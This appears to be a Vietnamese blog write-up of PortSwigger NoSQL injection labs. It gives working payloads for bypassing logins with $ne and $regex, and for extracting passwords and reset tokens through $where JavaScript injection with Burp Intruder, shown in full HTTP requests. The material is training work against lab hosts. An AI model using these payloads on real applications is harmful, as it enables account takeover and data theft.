---
title: "[PortSwigger Lab] - NoSQL Injection"
description: Solution of NoSQL Injection Lab
date: 2025-06-20 10:30:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, nosql injection]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-20-portswigger-lab-nosql-injection/nosql-injection.png
    alt: NoSQL Injection
---

## Introduction
---
### **NoSQL Injection**
**NoSQL Injection** là lỗ hổng bảo mật xảy ra khi **hacker** có thể chèn mã độc vào truy vấn mà ứng dụng gửi đến cơ sở dữ liệu **NoSQL** (như **MongoDB**, **CouchDB**, **Firebase**, v.v).

Nó tương tự như **SQL Injection**, nhưng dành cho các **cơ sở dữ liệu phi quan hệ (NoSQL)**, vốn không dùng ngôn ngữ **SQL truyền thống** mà sử dụng định dạng như **JSON**, **BSON**, **key-value**, v.v.

### How to dectect NoSQL Injection
#### Thử chèn các chuỗi bất thường (fuzzing)

```
category=%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
Nếu trả về lỗi hoặc phản hồi bất thường => có thể tồn tại **injection**.

#### Thử điều kiện **đúng/sai** để kiểm tra phản hồi
- **Sai:** `category=fizzy'+&&+0+&&+'x`
- **Đúng:** `category=fizzy'+&&+1+&&+'x`

Nếu phản hồi khác nhau => đã can thiệp được vào truy vấn.

#### Thử ghi đè điều kiện
`this.category == 'fizzy' || '1' == '1'`

## Exploit NoSQL Injection Lab
---
Comparison Operators

| Toán tử | Ý nghĩa                                  |
|--------|-------------------------------------------|
| `$eq`  | Bằng (equal)                              |
| `$ne`  | Khác (not equal)                          |
| `$gt`  | Lớn hơn (greater than)                    |
| `$gte` | Lớn hơn hoặc bằng (greater than or equal) |
| `$lt`  | Nhỏ hơn (less than)                       |
| `$lte` | Nhỏ hơn hoặc bằng (less than or equal)    |
| `$in`  | Nằm trong danh sách giá trị (in array)    |

Logical Operators

| Toán tử | Ý nghĩa                                                        |
|--------|-----------------------------------------------------------------|
| `$and` | Trả về các tài liệu mà **tất cả điều kiện** đều đúng           |
| `$or`  | Trả về các tài liệu mà **ít nhất một điều kiện** đúng          |
| `$nor` | Trả về các tài liệu mà **không điều kiện nào** đúng            |
| `$not` | Trả về các tài liệu mà **điều kiện không đúng**                |

Evaluation Operators

| Toán tử   | Ý nghĩa                                                                 |
|----------|--------------------------------------------------------------------------|
| `$regex` | So khớp giá trị trường với **biểu thức chính quy**                      |
| `$text`  | Tìm kiếm văn bản toàn văn (full-text search)                             |
| `$where` | Thực thi biểu thức **JavaScript tùy ý** để lọc tài liệu (rất nguy hiểm) |

### Lab: Detecting NoSQL injection
- Tìm kiếm với payload sau

```
https://0ae000cc03bc1cd9810bd010005b005f.web-security-academy.net/filter?category=xnxx'||1||'
```

- Detect **NoSQL** thành công, câu lệnh truy vấn sẽ diễn ra như sau

```
category=xnxx'||1||''
```
- Không có **category** nào là `xnxx` nên kiểm tra điều kiện `or(||)` đằng sau, điều kiện `1` là `true` => luôn đúng

### Lab: Exploiting NoSQL operator injection to bypass authentication
- Login bằng account `wiener`, và gửi request đó đến **Burp Repeater**
- Thay đổi thông tin login thành 

```http
POST /login HTTP/2
Host: 0acb00b604f862ee80052130006d00fd.web-security-academy.net
...
{"username":"wiener","password":{"$ne":""}}
```
- Từ response ta thấy đã thành công login bằng tài khoản `wiener` mà không cần **password** chính xác
- Biểu thức so sánh `"$ne":""`, tức `not equal` với `""`, mật khẩu không giống `""` là đúng
- Thay đổi **username** thành `administrator` và gửi lại request

```http
POST /login HTTP/2
Host: 0acb00b604f862ee80052130006d00fd.web-security-academy.net
...
{"username":"administrator","password":{"$ne":""}}
```
- **Response:** `Invalid username or password` => Không có người dùng `administrator`
- Thay đổi payload với `$regex` để so khớp **username**

```http
POST /login HTTP/2
Host: 0acb00b604f862ee80052130006d00fd.web-security-academy.net
...
{"username":{"$regex":"admin*"},"password":{"$ne":""}}
```
- Từ **response** ta thấy tên của admin 

```http
HTTP/2 302 Found
Location: /my-account?id=adminlopax4wt
Set-Cookie: session=3hQNxakpw9zd2lhsVjbh6ihrJVJTHNxl; Secure; HttpOnly; SameSite=None
```
- Không thể **follow-redirect** để đăng nhập với `adminlopax4wt` vì **Burp** không lại **cookie** khi **follow-redirect**
- Idea:
    - Copy **cookie** được **set** có `adminlopax4wt` và thay đổi nó trên trình duyệt bằng **devtool** hoặc **cookie editor**
    - Có thể sử lại **request** với **cookie** được **set**

```http
POST /my-account HTTP/2
Host: 0acb00b604f862ee80052130006d00fd.web-security-academy.net
Cookie: session=3hQNxakpw9zd2lhsVjbh6ihrJVJTHNxl
```

### Lab: Exploiting NoSQL injection to extract data
- Login bằng account `wiener`
- Quan sát **Http history**, có request:

```http
GET /user/lookup?user=wiener HTTP/2
Host: 0a9e006904807f3f801c4e2f000a00d2.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 81

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```
- Thử thay đổi `user=administrator`

```json
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```
- Thử ghi đè điều kiện `user=administrator'&&1=='1` => **NoSQL Injection**

```http
GET /user/lookup?user=administrator'%26%261=='1 HTTP/2
Host: 0a9e006904807f3f801c4e2f000a00d2.web-security-academy.net
```
- Câu truy vấn sẽ trở thành `{"$where":"this.username == 'administrator'&&1=='1'"}`
- Đoán độ dài của **password**: `user=administrator'&&this.password.length=='1`

```http
GET /user/lookup?user=administrator'%26%26this.password.length=='1 HTTP/2
Host: 0a9e006904807f3f801c4e2f000a00d2.web-security-academy.net
```
- Sử dụng **Burp Intruder** để tự động hóa quá trình tấn công
    - **Add** tại `1`
    - **Payload type:** `Numbers`
    - **From** 0 **To** 30 **Step** 1
    - **Start attack**
- Quan sát **length** khác thường của **response** trả về là **request** có **password length** chính xác
- Đã biết được **password length** => lấy **password** theo từng vị trí: `user=administrator'&&this.password[0]=='a`
    - Add tại `0` và `a`
    - Chọn chế độ **Cluster bomb attack**
    - Tại vị trí `0` chọn **Payload type:** `Numbers` > **From** 0 **To** `password length - 1` **Step** 1 (vì đây là **index**)
    - Tại vị trí `a` chọn **Payload type:** `Brute force` > `Min length = Max length = 1`
- Quan sát **length** khác thường của **response** trả về là các **request** có ký tự đúng của từng **index**
- Ghép chúng lại và đăng nhập bằng `administrator`

### Lab: Exploiting NoSQL operator injection to extract unknown fields
- Login bằng account bất kỳ => `"Invalid username or password"`
- Thử bypass bằng `$ne` => `"Account locked: please reset your password"`

```http
POST /login HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
{
  "username":"carlos",
  "password":{"$ne":""}
}
```
- Thêm `$where` vào payload

```http
POST /login HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
{
  "username":"carlos",
  "password":{"$ne":""},
  "$where":"0"
}
```
- `"$where":"0"` => `"Invalid username or password"`
- `"$where":"1"` => `"Account locked: please reset your password"`
- Cho thấy có thể sử dụng **Javascript** trong `$where`

```js
db.users.find({
  username: "carlos",
  password: { $ne: "" },
  $where: "0"
})
```
- Ứng dụng hoạt động như sau:
  - Khi `"$where":"0"` thì nó sẽ trả về **null**, tức không có **document** nào => `"Invalid username or password"`
  - khi `"$where":"1"` thì nó sẽ trả về **Object**, tức có **document** => `"Account locked: please reset your password"`, không có mật khẩu thực => **khả nghi** => **Block**
- Ta lợi dụng 2 tín hiệu trên để lấy **password** của `carlos`
- Tìm **index** trường chứa **reset token**

```http
POST /login HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
{
  "username":"carlos",
  "password":{"$ne":""},
  "$where":"Object.keys(this)[0].match('id')"
}
```
- Phân tích cú pháp:
  - **Object.keys(this)**: trả về các trường của **document** tìm được (`['_id', 'username', 'password', 'email']`)
  - **Object.keys(this)[index].match(str)**: kiểm tra xem tên **field** tại **index** cho chứa **str** không, nếu có trả về `Object`, nếu không trả về `null`
  - Thử các trường hợp ta thấy trường chứa **reset token** ở `index 4`
- Gửi request đến **Burp Intruder**
- Tìm tên trường chứa **reset token**

```http
POST /login HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
{
  "username":"carlos",
  "password":{"$ne":""},
  "$where":"Object.keys(this)[3].match('^.{§1§}§a§.*')"
}
```
- Add tại vị trí `1` và `a`
- Chọn chế độ **Cluster bomb attack**
- Vị trí `1` chọn **Numbers**: **From** 0 **To** 20 **Step** 1
- Vị trí `a` chọn **Brute force**: `Min length = Max length = 1` (nhớ thêm chứ hoa vào nữa)
- **Start attack** và quan sát các **response** có độ dài bất thường, ghép lại được tên trường chứa **reset token**
- Phân tích **regex** `'^.{§1§}§a§.*'`
  - `^` = bắt đầu chuỗi
  - `.{n}` = bỏ qua n ký tự đầu tiên (dò vị trí)
  - `a` = ký tự bạn đang kiểm tra tại vị trí thứ n
  - `.*` = bỏ qua phần còn lại
- Tìm kiếm nội dung của trường vừa tìm được

```http
POST /login HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
{
  "username":"carlos",
  "password":{"$ne":""},
  "$where":"this.passwordReset.match('^.{§1§}§a§.*')"
}
```
- Cấu hình và chế độ quét như trên
- **Start attack** và quan sát các **response** có độ dài bất thường, ghép lại được nội dung trường chứa **reset token**
- Gửi request để `change password`

```http
POST /forgot-password?passwordReset=dba8e52a04731f0f HTTP/2
Host: 0ac1002a0442c03480b9bcce009800fb.web-security-academy.net
...
csrf=mhuFxodtozMxvczxCD8D1Cbmu3BLlbeF&username=carlos
```
- Chuột phải > **Request in browser** > **In original session**
- Thay đổi **password** và **login** bằng user `carlos`

---
Goodluck! 🍀🍀🍀 


